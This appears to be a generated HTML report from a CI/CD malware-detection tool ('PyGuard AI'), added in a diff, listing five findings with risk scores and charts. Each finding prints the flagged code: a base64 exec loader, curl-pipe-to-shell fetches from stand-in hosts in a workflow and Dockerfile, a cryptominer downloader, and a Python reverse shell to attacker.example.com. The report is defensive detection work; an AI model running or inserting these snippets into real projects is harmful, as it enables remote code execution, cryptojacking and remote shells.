@@ -1,0 +1,239 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>PyGuard AI — Security Report</title>
+        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+        <style>
+            body {
+                font-family: 'Segoe UI', Arial, sans-serif;
+                background: #0a192f;
+                color: #ccd6f6;
+                margin: 0;
+                padding: 0;
+            }
+            h1 {
+                color: #64ffda;
+                text-align: center;
+                padding: 25px 0 10px 0;
+                font-size: 2rem;
+            }
+            .container {
+                width: 90%;
+                max-width: 1200px;
+                margin: auto;
+            }
+            .summary {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 20px;
+                justify-content: center;
+                margin-bottom: 30px;
+            }
+            .card {
+                background: #112240;
+                border: 1px solid #233554;
+                border-radius: 12px;
+                padding: 20px;
+                flex: 1 1 300px;
+                min-width: 280px;
+                box-shadow: 0 0 10px rgba(100,255,218,0.08);
+            }
+            .card h2 {
+                color: #64ffda;
+                margin-bottom: 12px;
+                font-size: 1.2rem;
+            }
+            canvas {
+                background: #0b1b30;
+                border-radius: 10px;
+                padding: 10px;
+            }
+            .details {
+                margin-top: 40px;
+            }
+            .finding {
+                background: #112240;
+                border: 1px solid #233554;
+                border-radius: 10px;
+                padding: 15px;
+                margin-bottom: 15px;
+                transition: 0.2s;
+            }
+            .finding:hover {
+                border-color: #64ffda;
+                box-shadow: 0 0 10px rgba(100,255,218,0.2);
+            }
+            .risk {
+                font-weight: bold;
+                padding: 4px 8px;
+                border-radius: 6px;
+            }
+            .risk.CRITICAL { background: rgba(255, 0, 0, 0.2); color: #ff4c4c; }
+            .risk.HIGH { background: rgba(255, 165, 0, 0.2); color: #ffa500; }
+            .risk.MEDIUM { background: rgba(255, 255, 0, 0.15); color: #ffd700; }
+            .risk.LOW { background: rgba(50, 205, 50, 0.2); color: #9aff9a; }
+            code {
+                display: block;
+                background: #0b1b30;
+                color: #9aff9a;
+                padding: 10px;
+                border-radius: 8px;
+                font-size: 13px;
+                margin-top: 8px;
+                white-space: pre-wrap;
+                border: 1px solid #233554;
+            }
+            footer {
+                text-align: center;
+                color: #8892b0;
+                font-size: 13px;
+                margin: 40px 0;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>🚀 PyGuard AI — Integrity & Code Injection Detection Report</h1>
+        <div class="container">
+            <div class="summary">
+                <div class="card">
+                    <h2>🧾 Summary</h2>
+                    <p><b>Timestamp:</b> 2025-12-11 14:21:43.793254</p>
+                    <p><b>Repository:</b> D:\ai-cicd-security-tool\backend\repo</p>
+                    <p><b>Files Scanned:</b> 5</p>
+                    <p><b>Findings:</b> 5</p>
+                    <p><b>Overall Risk:</b> <span class="risk MEDIUM">MEDIUM</span></p>
+                </div>
+
+                <div class="card">
+                    <h2>Risk Score Chart</h2>
+                    <canvas id="riskChart" width="300" height="300"></canvas>
+                </div>
+
+                <div class="card">
+                    <h2>Threat Category Breakdown</h2>
+                    <canvas id="categoryChart" width="300" height="300"></canvas>
+                </div>
+            </div>
+
+            <div class="details">
+                <h2 style="color:#64ffda;">🧠 Detailed Findings</h2>
+    
+        <div class="finding">
+            <h3><span class="risk LOW">LOW</span> — app.py</h3>
+            <p><b>Category:</b> obfuscated</p>
+            <p><b>Threat %:</b> 55.9%</p>
+            <p><b>Matched Sample:</b> malicious_samples\obfuscated\obf_1.py</p>
+            <p><b>File Path:</b> <small>D:\ai-cicd-security-tool\backend\repo\app.py</small></p>
+            <code>exec(__import__("base64").b64decode(
+"cHJpbnQoIlNlY3JldCBQYXlsb2FkIExvYWRlZCIp"
+))
+</code>
+        </div>
+        
+        <div class="finding">
+            <h3><span class="risk HIGH">HIGH</span> — build.yml</h3>
+            <p><b>Category:</b> ci_attacks</p>
+            <p><b>Threat %:</b> 92.7%</p>
+            <p><b>Matched Sample:</b> malicious_samples\ci_attacks\ci_attack_1.yml</p>
+            <p><b>File Path:</b> <small>D:\ai-cicd-security-tool\backend\repo\build.yml</small></p>
+            <code>steps:
+  - name: Malicious Step
+    run: curl http://evil.com/backdoor.py | python3
+</code>
+        </div>
+        
+        <div class="finding">
+            <h3><span class="risk HIGH">HIGH</span> — Dockerfile</h3>
+            <p><b>Category:</b> docker_attacks</p>
+            <p><b>Threat %:</b> 89.2%</p>
+            <p><b>Matched Sample:</b> malicious_samples\docker_attacks\docker_attack_1.dockerfile</p>
+            <p><b>File Path:</b> <small>D:\ai-cicd-security-tool\backend\repo\Dockerfile</small></p>
+            <code>FROM python:3.9
+RUN curl http://attacker/payload.sh | bash
+</code>
+        </div>
+        
+        <div class="finding">
+            <h3><span class="risk HIGH">HIGH</span> — miner_loader.py</h3>
+            <p><b>Category:</b> miners</p>
+            <p><b>Threat %:</b> 96.4%</p>
+            <p><b>Matched Sample:</b> malicious_samples\miners\miner_1.py</p>
+            <p><b>File Path:</b> <small>D:\ai-cicd-security-tool\backend\repo\miner_loader.py</small></p>
+            <code>import requests,subprocess
+binfile = requests.get("http://malicious.com/miner").content
+open("xmrig","wb").write(binfile)
+subprocess.call(["chmod","+x","xmrig"])
+subprocess.Popen(["./xmrig","--donate-level","1"], stdout=subprocess.DEVNULL)
+</code>
+        </div>
+        
+        <div class="finding">
+            <h3><span class="risk MEDIUM">MEDIUM</span> — server.py</h3>
+            <p><b>Category:</b> reverse_shells</p>
+            <p><b>Threat %:</b> 73.6%</p>
+            <p><b>Matched Sample:</b> malicious_samples\reverse_shells\rev_shell_1.py</p>
+            <p><b>File Path:</b> <small>D:\ai-cicd-security-tool\backend\repo\server.py</small></p>
+            <code>import socket,subprocess,os
+s=socket.socket()
+s.connect(("attacker.example.com",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+</code>
+        </div>
+        
+            </div>
+        </div>
+
+        <footer>
+            PyGuard AI © 2025 — Securing CI/CD Integrity with Machine Learning
+        </footer>
+
+        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+        <script>
+        const ctx1 = document.getElementById('riskChart').getContext('2d');
+        new Chart(ctx1, {
+            type: 'pie',
+            data: {
+                labels: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'],
+                datasets: [{
+                    data: [0, 3, 1, 1],
+                    backgroundColor: ['#ff4c4c', '#ffa500', '#ffd700', '#32cd32'],
+                    borderColor: '#0a192f',
+                    borderWidth: 2
+                }]
+            },
+            options: {
+                plugins: {
+                    legend: { labels: { color: '#ccd6f6' } }
+                }
+            }
+        });
+
+        const ctx2 = document.getElementById('categoryChart').getContext('2d');
+        new Chart(ctx2, {
+            type: 'bar',
+            data: {
+                labels: ['obfuscated', 'ci_attacks', 'docker_attacks', 'miners', 'reverse_shells'],
+                datasets: [{
+                    label: 'Threat Count',
+                    data: [1, 1, 1, 1, 1],
+                    backgroundColor: '#64ffda'
+                }]
+            },
+            options: {
+                scales: {
+                    x: { ticks: { color: '#ccd6f6' } },
+                    y: { ticks: { color: '#ccd6f6' } }
+                },
+                plugins: {
+                    legend: { labels: { color: '#ccd6f6' } }
+                }
+            }
+        });
+        </script>
+    </body>
+    </html>
+    
